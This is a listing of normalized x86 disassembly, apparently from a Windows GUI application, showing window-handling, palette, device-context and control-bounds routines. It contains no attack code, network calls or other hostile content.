mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_44ae98
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_468184
sub_44b975
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40331c
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_403190
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_40331c
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
sub_44ba04
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_44a018
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_44ba38
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_44ba04
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_44ccd0
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_451374
test eax eax
je r-xdata
mov esi eax
sub_44ba80
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_418314
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebx ] eax
sub_44baa8
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_41860c
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_403190
xor eax eax
mov [ ebx ] eax
sub_44bac8
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44baf8
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_418834
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44bba8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418898
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_44bb81
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_44bd34
call sub_403a08
call sub_403a08
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_418470
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_4248a8
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_44bbb4
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_418834
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44bc52
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bc59
mov eax [ rw-data ]
call sub_418898
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_44bc2a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_44bd34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_424904
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_418470
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_4248a8
test al al
je r-xdata
sub_44bc60
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax esi
call sub_44bd34
mov edx ebx
and dl 0xfc
mov eax esi
call sub_424420
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_44bc8c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_424a88
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_424a8c
mov eax [ ebp - 0x4 ]
call sub_44bd80
mov eax [ rw-data ]
call sub_418834
mov ebx eax
xor eax eax
push ebp
push sub_44bd11
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_418314
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418898
retn
call sub_44baf8
sub_44bd34
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_424a8c
mov edx ebx
mov eax [ rw-data ]
call sub_418848
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_44bd80
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44d7d0
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_44bdac
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403160
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_44bde8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_418b68
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_44be30
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_44beec
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44bfb9
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bfc0
lea eax [ ebp - 0x1c ]
call sub_403f20
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_40338c
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_45cc8c
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d6c
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_403f74
sub_44bfdc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44c043
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4598a0
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_44d18c
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403340
mov edx [ eax + 0x64 ]
pop eax
call sub_40432c
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c04a
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
mov al 0x1
sub_44c050
push ebx
mov ebx eax
mov eax ebx
call sub_4598c8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403340
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44c084
push ebx
mov ebx eax
mov eax ebx
call sub_459918
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403340
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_40432c
je r-xdata
mov al 0x1
pop ebx
retn
sub_44c0bc
push ebx
mov ebx eax
mov eax ebx
call sub_459954
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403340
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44c0f0
push ebx
mov ebx eax
mov eax ebx
call sub_421044
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44c118
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44d1bc
sub_44c138
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_44c158
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_403f74
sub_44c17c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_44d0ac
sub_44c19c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_44c1c8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403340
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403340
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_40432c
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403340
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_44c22c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44cb08
sub_44c24c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44caf4
sub_44c26c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_44c28c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420754
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42386c
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_44d23c
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44bdac
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_44e100
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_44c364
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_40355c
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_46c09c
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403544
push edi
xor ecx ecx
mov edx 0xb039
call sub_44e340
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_44cb2c
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_40338c
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_403190
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_403190
mov eax [ edi + 0x68 ]
call sub_403190
mov eax [ edi + 0x64 ]
call sub_4088dc
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4207a0
test bl bl
jle r-xdata
sub_44c430
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_44c458
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_40338c
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44c4e0
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_44c7e0
sub_44c500
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_403190
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_44f15c
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_40338c
mov edx ebx
mov eax edi
call sub_420824
mov eax ebx
mov si 0xffd9
call sub_40338c
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_44c5c8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_420bb4
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_44e340
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_44e340
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_44e340
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_44e340
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_44e340
sub_44c65c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_420a70
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_44d144
jmp r-xdata
xor edx edx
mov eax esi
call sub_44c500
sub_44c6a0
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_40338c
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_44c4e0
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_40338c
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_44c748
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_44e8d0
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44d5d4
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_44c7e0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_44e340
mov eax ebx
mov si 0xffd0
call sub_40338c
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_40338c
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_44c7e0
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_453d8c
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_44c8fc
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_44c920
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_44c948
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_44c96c
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_44c990
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_44ca8b
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_40338c
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ca92
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_41860c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_40338c
test edi edi
